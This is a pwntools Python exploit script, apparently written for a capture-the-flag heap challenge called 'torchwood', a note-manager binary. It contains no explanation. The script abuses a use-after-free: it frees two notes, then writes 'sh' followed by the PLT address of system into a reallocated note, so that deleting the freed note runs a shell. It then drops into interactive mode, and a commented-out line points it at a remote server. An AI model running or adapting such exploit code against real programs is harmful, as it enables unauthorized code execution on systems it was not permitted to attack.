#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = process('./torchwood')
# io = remote('172.1.3.9', 8888)
elf = ELF('./torchwood')
libc = ELF('./libc-2.23.so') 
def new(index, notetype, value, lenth = 0):
    io.sendlineafter('ote > ', '1')
    io.sendlineafter('dex > ', str(index))
    io.sendlineafter('ype > ', str(notetype))
    if(notetype == 1): # int
        io.sendlineafter('lue > ', str(value))

    else:
        io.sendlineafter('gth > ', str(lenth))
        io.sendlineafter('lue > ', value)


def delete(index):
    io.sendlineafter('ote > ', '2')
    io.sendlineafter('dex > ', str(index))

def show(index):
    io.sendlineafter('ote > ', '3')
    io.sendlineafter('dex > ', str(index))

if __name__ == '__main__':
    raw_input('debug > ')
    new(0, 1, 1111)
    new(1, 1, 2222)
    new(2, 1, 3333)
    delete(0)
    delete(1)
    #
    content = 'sh\x00\x00' + p32(elf.plt['system'])

    new(3, 2, content, 12)
    raw_input('ready to delete 0')
    delete(0)
    io.interactive()




